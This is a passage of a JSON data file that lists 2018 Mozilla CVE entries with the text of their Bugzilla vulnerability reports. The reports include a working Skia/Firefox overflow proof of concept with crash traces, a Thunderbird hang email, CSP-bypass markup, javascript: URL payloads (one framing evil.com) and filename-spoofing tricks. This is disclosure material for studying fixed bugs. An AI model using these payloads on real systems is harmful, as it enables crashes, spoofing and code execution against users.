      }
    ],
    "CVE-2018-5159": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1441941",
        "title": "Skia and Firefox: Integer overflow in SkTDArray leading to out-of-bounds write",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36 Steps to reproduce: Hi, below is a bug report for a bug I also reported today in the Skia issue tracker (https://bugs.chromium.org/p/skia/issues/detail?id=7674). I assume it will be handled over there, but since this is a security issue impacting Firefox and since it is under 90-day disclosure deadline I am reporting it here as well. I also want to raise attention to the fact that Skia in Mozilla repository is at least several months behind the version in https://cs.chromium.org so apart from this issue you are also affected by other issues that are already fixed in the main repo. Please let me know how you would prefer to handle issues like this in the future. Original report follows: ***Please note: This bug is subject to a 90 day disclosure deadline. After 90 days elapse or a patch has been made broadly available, the bug report will become visible to the public.*** In Skia, SkTDArray stores length (fCount) and capacity (fReserve) as 32-bit ints and does not perform any integer overflow checks. There are a couple of places where an integer overflow could occur: (1) https://cs.chromium.org/chromium/src/third_party/skia/include/private/SkTDArray.h?rcl=a93a14a99816d25b773f0b12868143702baf44bf&l=369 (2) https://cs.chromium.org/chromium/src/third_party/skia/include/private/SkTDArray.h?rcl=a93a14a99816d25b773f0b12868143702baf44bf&l=382 (3) https://cs.chromium.org/chromium/src/third_party/skia/include/private/SkTDArray.h?rcl=a93a14a99816d25b773f0b12868143702baf44bf&l=383 and possibly others In addition, on 32-bit systems, multiplication integer overflows could occur in several places where expressions such as fReserve * sizeof(T) sizeof(T) * count etc. are used. An integer overflow in (2) above is especially dangerous as it will cause too little memory to be allocated to hold the array which will cause a out-of-bounds write when e.g. appending an element. I have successfully demonstrated the issue by causing an overflow in fPts array in SkPathMeasure (https://cs.chromium.org/chromium/src/third_party/skia/include/core/SkPathMeasure.h?l=104&rcl=23d97760248300b7aec213a36f8b0485857240b5) which is used when rendering dashed paths. The PoC requires a lot of memory (My estimate is 16+1 GB for storing the path, additional 16GB for the SkTDArray we are corrupting), however there might be less demanding paths for triggering SkTDArray integer overflows. PoC program for Skia ================================================================= #include <stdio.h> #include \"SkCanvas.h\" #include \"SkPath.h\" #include \"SkGradientShader.h\" #include \"SkBitmap.h\" #include \"SkDashPathEffect.h\" int main (int argc, char * const argv[]) { SkBitmap bitmap; bitmap.allocN32Pixels(500, 500); //Create Canvas SkCanvas canvas(bitmap); SkPaint p; p.setAntiAlias(false); float intervals[] = { 0, 10e9f }; p.setStyle(SkPaint::kStroke_Style); p.setPathEffect(SkDashPathEffect::Make(intervals, SK_ARRAY_COUNT(intervals), 0)); SkPath path; unsigned quadraticarr[] = {13, 68, 258, 1053, 1323, 2608, 10018, 15668, 59838, 557493, 696873, 871098, 4153813, 15845608, 48357008, 118059138, 288230353, 360287948, 562949933, 703687423, 1099511613, 0}; path.moveTo(0, 0); unsigned numpoints = 1; unsigned i = 1; unsigned qaindex = 0; while(numpoints < 2147483647) { if(numpoints == quadraticarr[qaindex]) { path.quadTo(i, 0, i, 0); qaindex++; numpoints += 2; } else { path.lineTo(i, 0); numpoints += 1; } i++; if(i == 1000000) { path.moveTo(0, 0); numpoints += 1; i = 1; } } printf(\"done building path\\n\"); canvas.drawPath(path, p); return 0; } ================================================================= ASan output: ASAN:DEADLYSIGNAL ================================================================= ==39779==ERROR: AddressSanitizer: SEGV on unknown address 0x7fefc321c7d8 (pc 0x7ff2dac9cf66 bp 0x7ffcb5a46540 sp 0x7ffcb5a45cc8 T0) #0 0x7ff2dac9cf65 (/lib/x86_64-linux-gnu/libc.so.6+0x83f65) #1 0x7bb66c in __asan_memcpy (/usr/local/google/home/ifratric/p0/skia/skia/out/asan/SkiaSDLExample+0x7bb66c) #2 0xcb2a33 in SkTDArray<SkPoint>::append(int, SkPoint const*) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../include/private/../private/SkTDArray.h:184:17 #3 0xcb8b9a in SkPathMeasure::buildSegments() /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkPathMeasure.cpp:341:21 #4 0xcbb5f4 in SkPathMeasure::getLength() /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkPathMeasure.cpp:513:9 #5 0xcbb5f4 in SkPathMeasure::nextContour() /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkPathMeasure.cpp:688 #6 0x1805c14 in SkDashPath::InternalFilter(SkPath*, SkPath const&, SkStrokeRec*, SkRect const*, float const*, int, float, int, float, SkDashPath::StrokeRecApplication) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/utils/SkDashPath.cpp:482:14 #7 0xe9cf60 in SkDashImpl::filterPath(SkPath*, SkPath const&, SkStrokeRec*, SkRect const*) const /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/effects/SkDashPathEffect.cpp:40:12 #8 0xc8fbef in SkPaint::getFillPath(SkPath const&, SkPath*, SkRect const*, float) const /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkPaint.cpp:1500:24 #9 0xbdbc26 in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool, bool, SkBlitter*, SkInitOnceData*) const /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkDraw.cpp:1120:18 #10 0x169b16e in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool) const /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkDraw.h:58:9 #11 0x169b16e in SkBitmapDevice::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkBitmapDevice.cpp:226 #12 0xb748d1 in SkCanvas::onDrawPath(SkPath const&, SkPaint const&) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkCanvas.cpp:2167:9 #13 0xb6b01a in SkCanvas::drawPath(SkPath const&, SkPaint const&) /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../src/core/SkCanvas.cpp:1757:5 #14 0x8031dc in main /usr/local/google/home/ifratric/p0/skia/skia/out/asan/../../example/SkiaSDLExample.cpp:49:5 #15 0x7ff2dac392b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0) #16 0x733519 in _start (/usr/local/google/home/ifratric/p0/skia/skia/out/asan/SkiaSDLExample+0x733519) The issue can also be triggered via the web in Mozilla Firefox PoC for Mozilla Firefox on Linux (I used Firefox ASan build from https://developer.mozilla.org/en-US/docs/Mozilla/Testing/Firefox_and_Address_Sanitizer) ================================================================= <canvas id=\"canvas\" width=\"64\" height=\"64\"></canvas> <br> <button onclick=\"go()\">go</button> <script> var canvas = document.getElementById(\"canvas\"); var ctx = canvas.getContext(\"2d\"); function go() { ctx.beginPath(); ctx.mozImageSmoothingEnabled = false; ctx.webkitImageSmoothingEnabled = false; ctx.msImageSmoothingEnabled = false; ctx.imageSmoothingEnabled = false; linedasharr = [0, 1e+37]; ctx.setLineDash(linedasharr); quadraticarr = [13, 68, 258, 1053, 1323, 2608, 10018, 15668, 59838, 557493, 696873, 871098, 4153813, 15845608, 48357008, 118059138, 288230353, 360287948, 562949933, 703687423, 1099511613]; ctx.moveTo(0, 0); numpoints = 1; i = 1; qaindex = 0; while(numpoints < 2147483647) { if(numpoints == quadraticarr[qaindex]) { ctx.quadraticCurveTo(i, 0, i, 0); qaindex++; numpoints += 2; } else { ctx.lineTo(i, 0); numpoints += 1; } i++; if(i == 1000000) { ctx.moveTo(0, 0); numpoints += 1; i = 1; } } alert(\"done building path\"); ctx.stroke(); alert(\"exploit failed\"); } </script> ================================================================= ASan output: AddressSanitizer:DEADLYSIGNAL ================================================================= ==37732==ERROR: AddressSanitizer: SEGV on unknown address 0x7ff86d20e7d8 (pc 0x7ff7c1233701 bp 0x7fffd19dd5f0 sp 0x7fffd19dd420 T0) ==37732==The signal is caused by a WRITE memory access. #0 0x7ff7c1233700 in append /builds/worker/workspace/build/src/gfx/skia/skia/include/core/../private/SkTDArray.h:184:17 #1 0x7ff7c1233700 in SkPathMeasure::buildSegments() /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkPathMeasure.cpp:342 #2 0x7ff7c1235be1 in getLength /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkPathMeasure.cpp:516:15 #3 0x7ff7c1235be1 in SkPathMeasure::nextContour() /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkPathMeasure.cpp:688 #4 0x7ff7c112905e in SkDashPath::InternalFilter(SkPath*, SkPath const&, SkStrokeRec*, SkRect const*, float const*, int, float, int, float, SkDashPath::StrokeRecApplication) /builds/worker/workspace/build/src/gfx/skia/skia/src/utils/SkDashPath.cpp:307:19 #5 0x7ff7c0bf9ed0 in SkDashPathEffect::filterPath(SkPath*, SkPath const&, SkStrokeRec*, SkRect const*) const /builds/worker/workspace/build/src/gfx/skia/skia/src/effects/SkDashPathEffect.cpp:40:12 #6 0x7ff7c1210ed6 in SkPaint::getFillPath(SkPath const&, SkPath*, SkRect const*, float) const /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkPaint.cpp:1969:37 #7 0x7ff7c0ec9156 in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool, bool, SkBlitter*) const /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkDraw.cpp:1141:25 #8 0x7ff7c0b8de4b in drawPath /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkDraw.h:55:15 #9 0x7ff7c0b8de4b in SkBitmapDevice::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool) /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkBitmapDevice.cpp:235 #10 0x7ff7c0bbc691 in SkCanvas::onDrawPath(SkPath const&, SkPaint const&) /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkCanvas.cpp:2227:23 #11 0x7ff7b86965b4 in mozilla::gfx::DrawTargetSkia::Stroke(mozilla::gfx::Path const*, mozilla::gfx::Pattern const&, mozilla::gfx::StrokeOptions const&, mozilla::gfx::DrawOptions const&) /builds/worker/workspace/build/src/gfx/2d/DrawTargetSkia.cpp:829:12 #12 0x7ff7bbd34dcc in mozilla::dom::CanvasRenderingContext2D::Stroke() /builds/worker/workspace/build/src/dom/canvas/CanvasRenderingContext2D.cpp:3562:11 #13 0x7ff7ba9b0701 in mozilla::dom::CanvasRenderingContext2DBinding::stroke(JSContext*, JS::Handle<JSObject*>, mozilla::dom::CanvasRenderingContext2D*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/CanvasRenderingContext2DBinding.cpp:3138:13 #14 0x7ff7bbc3b4d1 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3031:13 #15 0x7ff7c26ae3b8 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:290:15 #16 0x7ff7c26ae3b8 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:467 #17 0x7ff7c28ecd17 in js::jit::DoCallFallback(JSContext*, js::jit::BaselineFrame*, js::jit::ICCall_Fallback*, unsigned int, JS::Value*, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jit/BaselineIC.cpp:2383:14 #18 0x1a432b56061a (<unknown module>)"
      }
    ],
    "CVE-2018-5160": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1436117",
        "title": "A WrappedI420Buffer in MediaPipeline might outlive its buffer",
        "description": "One use of a WrappedI420Buffer in MediaPipeline [1] gets passed on further into the stack, but nothing keeps the PlanarYCbCrImage that owns the actual pixel buffer alive. The WrappedI420Buffer outliving the PlanarYCbCrImage would be bad, but I hope and think we only end up reading that data as an image in a webrtc encoder and not doing any writing. [1] https://searchfox.org/mozilla-central/rev/f80722d4f3bfb722c5ec53880c4a7efb71285676/media/webrtc/signaling/src/mediapipeline/MediaPipeline.cpp#345-356"
      }
    ],
    "CVE-2018-5161": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1411720",
        "title": "TBE-01-017: Multiple Hangs via malformed Headers",
        "description": "An issue was discovered to let an attacker craft an email which causes the victim’s Thunderbird process to hang on receiving the message. For some test cases, the hang persisted across a restart of the Thunderbird software, thus making it impossible to use the application unless the email was deleted via the mail provider’s web interface. Below is an example of an email culprit. Email which causes a hang: Content-Type: text/plain Subject: HANG! From: evil@attacker To: sad@victim CC: @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ meowmeow Once the email is processed, Thunderbird freezes and consumes 100% of the CPU resources. Moreover, the amount of used memory increases. This problem is caused by an escaping algorithm which processes the header field in a manner presented next @@ => \"@\"@ @@@ => \"\\\"@\\\"@\"@ @@@@ => \"\\\"\\\\\\\"@\\\\\\\"@\\\"@\"@ @@@@@@ => \"\\\"\\\\\\\"\\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"@\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"@\\\\\\\\\\\\\\\"@\\\\\\\"@\\\"@\"@ Adding @ characters to the header entry increases the length of the encoded string exponentially, thus resulting in high CPU and memory consumption. All header types permitted to contain email addresses, e.g. From, To, BCC, Resent-From, are affected by this issue. It is recommended to review and fix the escaping algorithm to avoid Denial of Service and foster more robust parsing. For the original report as PDF; see bug 1411701."
      }
    ],
    "CVE-2018-5164": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1416045",
        "title": "CSP is not applied to documents sent through multipart/x-mixed-replace",
        "description": "From bug 1223743. PoC: http://mallory.csrf.jp/x-mixed-replace/csp/bad.php"
      }
    ],
    "CVE-2018-5166": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1437325",
        "title": "Web extension - Web Request host permission bypass using filterReponseData",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 Build ID: 20180206200532 Steps to reproduce: By leveraging the request redirection and filterReponseData, one can bypass the host permission to access content returned by an arbitrary host. Actual results: The attachment is a POC extension that have the webRequest, webRequestBlocking and http://localhost permission that upon loading will : 1- Open a new tabs to http://localhost 2- Redirect the request toward https://bugzilla.mozilla.org/user_profile 3- Output the content of https://bugzilla.mozilla.org/user_profile in the console 4- Close the tab Expected results: filterResponseData should be allowed only if the extension has the host permission for the fetched resource."
      }
    ],
    "CVE-2018-5167": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1447969",
        "title": "Old console and current debugger linkify javascript: URLs",
        "description": "A response returning application/json will be displayed in the JSON Viewer and links in the data will be linkified. While this might be convenient, javascript: links will also be linkified. Web services don't expect that JSON output needs to be sanitized, so injecting a javascript: URL into the output is often trivial. See for example this Mozilla URL: > https://token.services.mozilla.com/1.0/sync/javascript:alert(JSON.stringify(JSONView.headers.request%29%29 If the user somehow clicks value of the errors.0.name property an alert message will show up - JavaScript code executed successfully. And while the principal is set to the null principal so that the code cannot access document.cookies for example, it can access the JSONView object injected by the JSON Viewer. That object contains among other things all request headers - meaning also cookies and authorization tokens. This JavaScript code can also trigger saving of arbitrary content, though that shouldn't be as critical: > https://token.services.mozilla.com/1.0/sync/javascript:void(window.dispatchEvent(new%2520CustomEvent(%2527contentMessage%2527,%7Bdetail:%7Btype:%2527save%2527,value:%2527data:,foobar%2527%7D%7D%29%29%29 Clearly, JSON Viewer should only linkify HTTP and HTTPS URLs. For reference, the problematic code line is https://dxr.mozilla.org/mozilla-central/rev/6ff60a083701d08c52702daf50f28e8f46ae3a1c/devtools/client/shared/components/reps/reps.js#88. While this also allows data: and chrome: URLs, browser security mechanisms will no longer allow navigating to those."
      }
    ],
    "CVE-2018-5169": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1319157",
        "title": "Home button drop handler should urlSecurityCheck all the links in a pipe (|) separated set of URLs dropped on it",
        "description": "... or just not allow dropping such a set of URLs."
      }
    ],
    "CVE-2018-5170": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1411732",
        "title": "TBE-01-009: Filename Spoofing for external Attachments",
        "description": "Thunderbird implements external attachments via the X-Mozilla-External- Attachment-URL. The actual resource is specified via this header. It was discovered that the GUI displays the filename outlined in the “Content-Type” header, which is not related to the real resource. This can be abused to trick the user into opening an attachment, believing that this item is a safe resource like an image, HTML file or similar. Conversely, as illustrated next, Thunderbird would fetch a completely different file --------------A320A96F6639F3C578F35383 Content-Type: message/external-body; access-type=whatever; name=\"NameWhichIsShownInTheGui.html\" X-Mozilla-External-Attachment-URL: data:application/pdf,aaaaaaaaaaaaaaaaaaaaa Content-Transfer-Encoding: 7bit Content-Disposition: inline; filename=\"thisigui3.html\" Content-Transfer-Encoding: binary Cure53, Berlin · 10/11/17 [Ghost Body1234]<h1>asdf</h1><script>alert(1)</script> One solution to this problem would be to display a warning box to the user before fetching the external resource, making user clearly aware of the potential risks. Another approach could be to extract the filename via the X-Mozilla-External-Attachment-URL instead of the Content-Type header. For the original report as PDF; see bug 1411701."
      }
    ],
    "CVE-2018-5172": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1436482",
        "title": "Content scripts sometimes match the document URI rather than the principal URI",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Steps to reproduce: 1. Install attached PoC extension 2. Once a page appears, click on the button. 3. A prompt will appear, paste by hitting (CTRL+V) then hit 'Enter' 4. Executable file is downloaded and executed. This is just an example on one content handler, you can do the same with PDFs. Interestingly, JSON previewer cannot have code injected to it. Actual results: Injected JS into feed preview which results in RCE with user interaction. Video: https://youtu.be/TRrdmuaFzuQ Expected results: In bug 1422231 I described how the feed reader preview page can be clickjacked to run arbitrary executable files. Although these previews are not accessible to web, they are for webextensions. This is bad because usually these have other API's that may be used to escalate privilege."
      }
    ],
    "CVE-2018-5173": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1438025",
        "title": "browser.downloads.download should remove \\u202E (RLO) chars",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Steps to reproduce: Added \"\\u202E\" to a filename passed to downloads.download() results in a filename spoof. Actual results: Downloading with filename=\"test\\u202Egpj.bat\" results in a filename appearing to be \"testtab.jpg\" in the downloads panel. When attempting to open this file, the prompt that appears reminding user that this is an executable is all reversed text and illegible. Expected results: Strip \"\\u202E\""
      }
    ],
    "CVE-2018-5175": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1432358",
        "title": "Universal CSP strict-dynamic bypass via require.js of browser resource",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0 Build ID: 20180122220231 Steps to reproduce: The URLs located in `resource://devtools-client-jsonview/.*` bypass CSP. ( maybe intentionally ) A `require.js` file is in the this directory and it can be used for CSP strict-dynamic bypass against any websites. Steps to reproduce: 1. Go to attached PoC( csp_bypass_require.html ). This page has strict CSP rules: <meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none';script-src 'nonce-random' 'strict-dynamic'\"> 2. However, you can see `alert(1)`. It is executed from the following code: <script data-main='data:,alert(1)'></script> <script src=\"resource://devtools-client-jsonview/lib/require.js\"></script> Actual results: CSP strict-dynamic is bypassed via browser resources. Expected results: CSP strict-dynamic should not be bypassed via browser resources."
      }
    ],
    "CVE-2018-5176": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1442840",
        "title": "Iframe injection & content spoofing & scripts execution via json viewer",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 Build ID: 20180206200532 Steps to reproduce: Hello , When we have a response of json with a parameter that a client can edit we can spoof the content wyciwyg using (\"javascript:) Example in gdata.youtube.com Just visit the link below and click in javascript : https://gdata.youtube.com/feeds/api/videos?format=5&max-results=8&v=%22JUST---CLICK-HERE--%3E%22javascript:document.write(/%3Ciframe%2520src=http:evil.com%3E/)&alt=jsonc Or https://gdata.youtube.com/feeds/api/videos?format=5&max-results=8&v=%22javascript:document.write(%2527%3Cscript%3Ealert(document.location)%3C/script%3E%2527)&alt=jsonc We can see that we have a frame of evil.com in gdata.youtube.com we can also execute a scripts using the same method . The frame is injected in view-source:wyciwyg://99/https://gdata.youtube.com......"
      }
    ],
    "CVE-2018-5177": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1451908",
        "title": "undefined behavior results in negative allocation size",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 Steps to reproduce: I've audited the the xslt format-number function implementation and found a corner case the results in a negative bufsize allocation (which is sign extended and casted to size_t on a call to new array[]). the bug lies in the file: mozilla-central/source/dom/xslt/xslt/txFormatNumberFunctionCall.cpp+273 the buggy code is: value = fabs(value) * multiplier; // Prefix nsAutoString res(prefix); int bufsize; if (value > 1) bufsize = (int)log10(value) + 30; else bufsize = 1 + 30; char* buf = new char[bufsize]; what happens is that the the value is checked earlier in the function to not be INF/-INF/NaN but is later multiplied by a possible multiplier that can cause it to turn into INF. when that happens, log10(INF) returns INF which when casted to int which is undefined (will result on x86 as a large negative number) and later on will be used as a size for allocation. steps to repro: browse to: https://www.w3schools.com/xml/tryxslt.asp?xmlfile=cdcatalog&xsltfile=cdcatalog_ex2 insert into the xsl table the text supplied in the attached file Actual results: (int)log10(value) is undefined when value is INF/-INF/NaN the resulting value is used afterwards as an allocation initialization. Expected results: there should've been a check for invalid double values after the multiplication (or drop the multiplication altogether). i'd recommend to drop the multiplication or add another test after multiplication."
      }
    ],
    "CVE-2018-5178": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1443891",
        "title": "Integer overflow in nsScriptableUnicodeConverter::ConvertFromByteArray can cause a heap buffer overflow",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:58.0) Gecko/20100101 Firefox/58.0 Build ID: 20180206200532 Steps to reproduce: I. The bug In nsScriptableUnicodeConverter::ConvertFromByteArray (ff-esr52/intl/uconv/nsScriptableUConv.cpp), the malloc() size argument on line 148 is computed from an unbounded integer value, which can overflow: 134:nsScriptableUnicodeConverter::ConvertFromByteArray(const uint8_t* aData, 135: uint32_t aCount, 136: nsAString& _retval) 137:{ 138: if (!mDecoder) 139: return NS_ERROR_FAILURE; 140: 141: nsresult rv = NS_OK; 142: int32_t inLength = aCount; 143: int32_t outLength; 144: rv = mDecoder->GetMaxLength(reinterpret_cast<const char*>(aData), 145: inLength, &outLength); 146: if (NS_SUCCEEDED(rv)) 147: { 148: char16_t* buf = (char16_t*)malloc((outLength+1) * sizeof(char16_t)); 149: if (!buf) 150: return NS_ERROR_OUT_OF_MEMORY; 151: 152: rv = mDecoder->Convert(reinterpret_cast<const char*>(aData), 153: &inLength, buf, &outLength); 154: if (NS_SUCCEEDED(rv)) 155: { 156: buf[outLength] = 0; 157: if (!_retval.Assign(buf, outLength, mozilla::fallible)) { 158: rv = NS_ERROR_OUT_OF_MEMORY; 159: } 160: } 161: free(buf); 162: return rv; 163: } 164: return NS_ERROR_FAILURE; 165: 166:} The outLength value is provided by GetMaxLength() (line 144), which is a member of nsIUnicodeDecoder class, and represented by nsUTF8ToUnicode::GetMaxLength in this case (see bug#1440926 for some background analysis of this family of classes). It is computed as the length of aData passed from the caller, plus 1. Consider for instance, that the length of aData is INT32_MAX-1. Then outLength will be INT32_MAX and will overflow on the addition operation (line 148), and become -2147483648. Then the multiplication operation by 2 (sizeof(char16_t)) will overflow it again, and the result will be truncated to zero and passed as an argument to malloc(). Here is an output of a simple test program written in C and compiled with Clang (Apple LLVM version 8.0.0 (clang-800.0.42.1)), which demostrates the effect of the unchecked integer arithmetic in this code: $ ./a.out INT32_MAX + 1 = -2147483648 (0x80000000) (INT32_MAX + 1) * 2 = 0 (0x0) Next, nsUTF8ToUnicode::Convert() on line 152 will populate the zero-sized buffer with unicode data derived from aData, using the original value of outLength (which is still INT32_MAX) as the bound. That will lead to overwrite of unowned memory which immediately follows the buffer, with caller-controlled data. II. Reachability analysis The only place where nsScriptableUnicodeConverter::ConvertFromByteArray is used in core code is nsScriptableUnicodeConverter::ConvertToUnicode. Both functions are directly exposed to privileged Javascript in Firefox. Therefore, I have identified 3 possible attack vectors: 1. Via a malicious extension Privileged Javascript can obtain an instance of nsScriptableUnicodeConverter via Components.classes class factory, as such: var converter = Components.classes[\"@mozilla.org/intl/scriptableunicodeconverter\"] .createInstance(Components.interfaces.nsIScriptableUnicodeConverter); And then call the ConvertToUnicode/ConvertFromByteArray functions directly with an arbitrary String or a TypedArray. https://developer.mozilla.org/en-US/docs/Mozilla/Tech/XPCOM/Reference/Interface/nsIScriptableUnicodeConverter 2. (1) implies that all Firefox installations which have installed an legitimate extension which uses nsIScriptableUnicodeConverter are affected. The specific attack vector in this case depends on how the extension uses the class, however it's likely to operate on user-controlled data. (See bug#289947 for example of such an extension and the user-controlled data which it processed) 3. There is a number of places in the components of Firefox written in Javascript, which instantiate and use nsScriptableUnicodeConverter for their own purposes. Notably devtools, password manager, settings, and import of bookmarks: nsScriptableUnicodeConverter::ConvertToUnicode: ./browser/base/content/test/urlbar/browser_urlbarCopying.js:12: return converter.ConvertToUnicode(input); ./devtools/client/debugger/content/views/sources-view.js:307: unicodeUrl = NetworkHelper.convertToUnicode(unescape(fullUrl)); ./devtools/client/debugger/content/views/sources-view.js:638: return NetworkHelper.convertToUnicode(unescape(source.url)); ./devtools/client/debugger/utils.js:149: let unicodeLabel = NetworkHelper.convertToUnicode(unescape(sourceLabel)); ./devtools/client/debugger/utils.js:185: let unicodeLabel = NetworkHelper.convertToUnicode(unescape(groupLabel)); ./devtools/client/netmonitor/netmonitor-view.js:556: let unicodeUrl = NetworkHelper.convertToUnicode(unescape(data.url)); ./devtools/client/netmonitor/request-utils.js:136: let name = NetworkHelper.convertToUnicode( ./devtools/client/netmonitor/request-utils.js:138: let query = NetworkHelper.convertToUnicode(unescape(url.query)); ./devtools/client/netmonitor/request-utils.js:147: return NetworkHelper.convertToUnicode(unescape(url.hostPort)); ./devtools/client/netmonitor/requests-menu-view.js:970: let unicodeUrl = NetworkHelper.convertToUnicode(unescape(uri.spec)); ./devtools/client/netmonitor/test/head.js:264: let unicodeUrl = NetworkHelper.convertToUnicode(unescape(aUrl)); ./devtools/client/netmonitor/test/head.js:265: let name = NetworkHelper.convertToUnicode(unescape(uri.fileName || uri.filePath || \"/\")); ./devtools/client/netmonitor/test/head.js:266: let query = NetworkHelper.convertToUnicode(unescape(uri.query)); ./devtools/client/scratchpad/scratchpad.js:1126: content = converter.ConvertToUnicode(aContent); ./devtools/server/actors/settings.js:35: let rawstr = converter.ConvertToUnicode(NetUtil.readInputStreamToString( ./devtools/shared/DevToolsUtils.js:472: // the guess is wrong, the conversion fails and convertToUnicode returns ./devtools/shared/DevToolsUtils.js:477: let unicodeSource = NetworkHelper.convertToUnicode(source, charset); ./devtools/shared/transport/packets.js:165: json = unicodeConverter.ConvertToUnicode(json); ./devtools/shared/webconsole/network-helper.js:87: convertToUnicode: function (text, charset) { ./devtools/shared/webconsole/network-helper.js:92: return conv.ConvertToUnicode(text); ./devtools/shared/webconsole/network-helper.js:110: return this.convertToUnicode(text, charset); ./devtools/shared/webconsole/network-helper.js:789: NetworkHelper.convertToUnicode(unescape(param[0])) : \"\", ./devtools/shared/webconsole/network-helper.js:791: NetworkHelper.convertToUnicode(unescape(param[1])) : \"\" ./devtools/shared/webconsole/network-monitor.js:411: NetworkHelper.convertToUnicode(data, request.contentCharset); ./dom/apps/AppsUtils.jsm:657: let data = JSON.parse(converter.ConvertToUnicode(NetUtil.readInputStreamToString(aStream, ./dom/settings/SettingsDB.jsm:91: let rawstr = converter.ConvertToUnicode(NetUtil.readInputStreamToString( ./services/common/utils.js:196: str = this._utf8Converter.ConvertToUnicode(str); ./toolkit/components/passwordmgr/crypto-SDR.js:130: plainText = this._utfConverter.ConvertToUnicode(plainOctet); ./toolkit/components/telemetry/tests/unit/head.js:144: let utf8string = unicodeConverter.ConvertToUnicode(observer.buffer); ./toolkit/identity/tests/unit/test_crypto_service.js:107: let result = utf8Converter.ConvertToUnicode(base64UrlDecode(target)); nsScriptableUnicodeConverter::ConvertFromByteArray: ./toolkit/components/places/BookmarkJSONUtils.jsm:203: let jsonString = converter.convertFromByteArray(aResult, ./toolkit/components/places/BookmarkJSONUtils.jsm:240: let jsonString = converter.convertFromByteArray(aResult, aResult.length); ./toolkit/components/places/tests/bookmarks/test_1016953-renaming-uncompressed.js:38: let jsonString = converter.convertFromByteArray(result, result.length); ./toolkit/components/places/tests/bookmarks/test_1016953-renaming-uncompressed.js:68: let jsonString = converter.convertFromByteArray(result, result.length); For example, BookmarkJSONUtils.jsm calls convertFromByteArray while importing bookmarks, with the data obtained from either a compressed file or an URL, which can be provided by an attacker. III. Exploitability With an arbitrary heap overflow and some prior heap grooming, it's possible to overwrite metadata of some object (a storage slot of an Array, for example) and thereby obtain an arbitrary read-write exploitation primitive, which can be leveraged into both an info-leak and arbitrary code execution. The bug was confirmed with the latest release source code of Firefox ESR. Actual results: code review"
      }
    ],
    "CVE-2018-5180": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1444086",
